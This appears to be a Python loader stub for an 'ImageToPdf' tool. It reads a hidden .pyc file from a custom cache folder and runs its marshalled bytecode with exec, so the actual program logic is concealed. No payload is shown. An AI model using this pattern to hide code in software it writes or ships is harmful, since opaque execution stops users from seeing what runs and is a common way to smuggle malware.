
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_8accb2b2868742edb26e88911b749625.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
